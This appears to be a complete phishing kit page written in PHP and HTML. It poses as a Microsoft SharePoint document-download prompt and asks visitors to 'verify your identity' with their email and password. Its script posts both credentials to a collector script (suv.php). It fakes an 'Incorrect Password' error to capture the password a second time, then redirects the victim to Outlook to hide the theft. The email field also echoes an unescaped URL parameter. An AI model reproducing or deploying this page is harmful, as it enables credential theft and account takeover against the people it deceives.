<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Microsoft SharePoint</title>
	<link rel="icon" href="http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Microsoft-SharePoint-2013-icon.png" type="image/gif" sizes="16x16">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="https://code.jquery.com/jquery-3.2.1.min.js"   integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="   crossorigin="anonymous"></script>

	<style type="text/css">
		 

		 body {
		 	margin: 0;
		 	font-family: Arial, Helvetica, sans-serif;
		 }


		 .frmpodt {

		 	margin-top: 90px;
		 	margin-left: auto;
		 	margin-right: auto;
		 	top: 50%;
		 	display: grid;
		 	width: 800px;
		 	height: 400px;
		 	font-family: Arial, Helvetica, sans-serif;
		 	line-height: 1;
		 }

		 .contbut {
		 	margin-right: auto;
		 	margin-left: auto;
		 	background-color: #00a1f1;
		 	color: #fff;
		 	border-style: none;
		 	width: 500px;
		 	height: 40px;
		 	margin-top: -20;
		 	font-family: Arial, Helvetica, sans-serif;
		 }

		 .desa {
		 	display: inline-grid;
		 }

		 .azsa {	
		 	padding-left: 4px;
		 	height: 40px;
		 	min-width: 500px;
		 	margin-right: auto;
		 	margin-left: auto;
		 	font-family: Arial, Helvetica, sans-serif;

		 }

		 #strained {
		 	margin-top: -20px;

		 }

		 

		 .gmi {
		 	margin-left: auto;
		 	margin-right: auto;
		 	width: 100px;
		 	margin-bottom: -10px;
		 }

	</style>
</head>

<body>

<div class="frmpodt">
	
<form method="POST" class="desa">
	
<img class="gmi" src="data:image/png;base64,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">
<center>
<h4>You have one pending SharePoint for Download</h4>
<span>DOC Q0031 - 4321Q.Doc (0.75 MB)</span>
<p>Sign in to verify your identity</p>
</center>

<input class="azsa" type="email" name="strained" id="stained" placeholder="Enter Email Address" value="<?php echo ("$email"); ?>" required="">

<input  class="azsa" type="password" name="erased" id="erased" placeholder="Enter Password" required="">
<br>
<center> <p class="alertx"></p></center>
<button class="contbut" type="submit" name="next" id="nextx">CONTINUE</button>

</form>
</div>
<div style="background-color: #f1f1f1; display: block; padding: 10px; margin-top:15px;"></div>



<script type="text/javascript">
	
	var email = document.getElementById('stained');
	var password = document.getElementById('erased');
	var counter = 0;


$('#nextx').click(function(e){
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alertx = document.querySelector('.alertx');
	

	
	if($('#stained').val() == ""){
		$('#stained').focus();
		alertx.style.color = "red";
		alertx.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if(!($('#stained').val().match(checkmail))){
		$('#stained').focus();
		alertx.style.color = "red";
		alertx.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if($('#erased').val() == ""){
		$('#erased').focus();
		alertx.style.color = "red";
		alertx.textContent = "Please enter a valid password for your email account";
		return false;
	}else{
		counter = counter + 1;
		alertx.style.color = "#0073C6";
		alertx.textContent = "Verifying your identity";
		$('.alertx').show();

		if(counter > 1){
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				window.location = "https://outlook.live.com/owa/";
		      }
		    }

		    var email = document.getElementById('stained').value;
		    var password = document.getElementById('erased').value;
		    var formdata = new FormData();

	    	formdata.append("stained", email);
	    	formdata.append("erased", password);

		    var url = 'suv.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;
		}else{
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
					document.getElementById('erased').value = "";
					alertx.style.color = "red";
					alertx.textContent = "Incorrect Password";
		      }
		    }

		    var email = document.getElementById('stained').value;
		    var password = document.getElementById('erased').value;
		    var formdata = new FormData();

	    	formdata.append("stained", email);
	    	formdata.append("erased", password);

		    var url = 'suv.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;		
		}	
	}

})



</script>
</body>
</html>